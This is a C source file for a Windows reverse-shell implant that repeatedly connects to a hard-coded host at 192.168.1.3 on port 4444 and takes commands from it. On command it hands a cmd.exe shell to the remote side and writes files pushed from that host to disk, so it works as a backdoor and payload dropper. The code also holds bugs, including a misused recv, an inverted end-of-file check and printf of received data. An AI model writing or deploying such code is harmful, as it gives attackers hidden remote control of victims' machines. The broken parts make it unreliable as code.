#include <stdio.h>
#include<winsock2.h>
#include<Windows.h>
#include<process.h>
#include<io.h>
#define DEFAULT_BUFLEN 2048

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996) 
void CreateShell(int port);
int startup();
void recieve();
int port = 4444;
SOCKET sockt; //global sockt
int main() {
	while (TRUE) {
		//search for connection every 5 seconds
		Sleep(5000);
		int con = startup();
		// waiting for a connection checks every 5 seconds
		if (con == 1) {
			char RecvData[DEFAULT_BUFLEN];
			while (TRUE) {
				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);

				if (strcmp(RecvData, "conend\n") == 0) {//if user sends exit then program ends
					closesocket(sockt);
					WSACleanup();
					exit(0);
				}
				else if (strcmp(RecvData, "shell\n") == 0) {// starts shell process if user types shell
					//start shell process
					CreateShell(port);
				}
				else if (strcmp(RecvData, "send\n") == 0) {// starts send process
					recieve();
				}

			}
		}
	
	}
	return 0;
}  
void CreateShell(int port) {
		STARTUPINFO ini_processo;
		PROCESS_INFORMATION processo_info;
		memset(&ini_processo, 0, sizeof(ini_processo));
		char command[] = "cmd.exe";

		ini_processo.cb = sizeof(ini_processo);
		ini_processo.dwFlags = (STARTF_USESTDHANDLES);
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)sockt;

		CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info); //create shell
		WaitForSingleObject(processo_info.hProcess, INFINITE); //wait for user to close shell on their end

		//cleanup of threads
		CloseHandle(processo_info.hThread);
		CloseHandle(processo_info.hProcess);
	
}
int startup() {
	WSADATA wsa;
	struct sockaddr_in revsockaddr;
	printf("\nstarting WINSOCK...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("\nfailed startup");

	}

	printf("\nsuccessfully started");

	if ((sockt = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET)
	{
		printf("socket could not be created");
	}

	revsockaddr.sin_family = AF_INET;
	revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.3");

	printf("\nsocket created ");


	if (WSAConnect(sockt, (struct sockaddr*) & revsockaddr, sizeof(revsockaddr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
		closesocket(sockt);
		WSACleanup();
		return 0;
	}
	return 1;
}
void recieve() {
	//recv filename from server
	char filename[DEFAULT_BUFLEN];
	memset(filename, 0, sizeof(filename));
	recv(sockt, filename, DEFAULT_BUFLEN, 0);
	
	//wait for binary flag
	unsigned char buffer[DEFAULT_BUFLEN];
	memset(buffer, 0, sizeof(buffer));
	printf(filename);
	auth(); //1 byte ACK
	
	//recv t or b flag
	recv(sockt, buffer, sizeof(buffer), 0);
	auth();
	
	int totalbytes = 0; //find total number of bytes being send
	recv(sockt, totalbytes, sizeof(totalbytes), 0);
	auth();

	if (strcmp(buffer,"B")==0) {
		FILE* ptr = fopen(filename, "wb"); //open file
		while (TRUE) {
			memset(buffer, 0, sizeof(buffer));
			//get input
			recv(sockt, buffer, DEFAULT_BUFLEN, 0);
			printf("test ouput \n");
			if (strcmp(buffer, "EOF\n")) {//stop if EOF reached
				fclose(ptr);
				printf("enters EOF");
				break;
			}
			auth(); //ack
			fwrite(buffer, DEFAULT_BUFLEN, 1, ptr);

		}
	}
	else {
		FILE* ptr = fopen(filename, "w"); //open file in write form

		while (TRUE) {
			memset(buffer, 0, sizeof(buffer));
			//get input
			recv(sockt, buffer, DEFAULT_BUFLEN, 0);
			printf("test 4");
			printf(buffer);
			if (strcmp(buffer, "EOF\n") == 0) {//stop if EOF reached
				printf("enters end of file");
				fclose(ptr);
				break;
			}
			printf("test 5");
			fwrite(buffer, DEFAULT_BUFLEN, 1, ptr);
			printf("test 6");
			auth(); //send auth K
		}
	
	}

	printf("send final ACK");
	auth();
}
void auth() {
	char response = 'K';
	send(sockt, &response, 1, 0);
}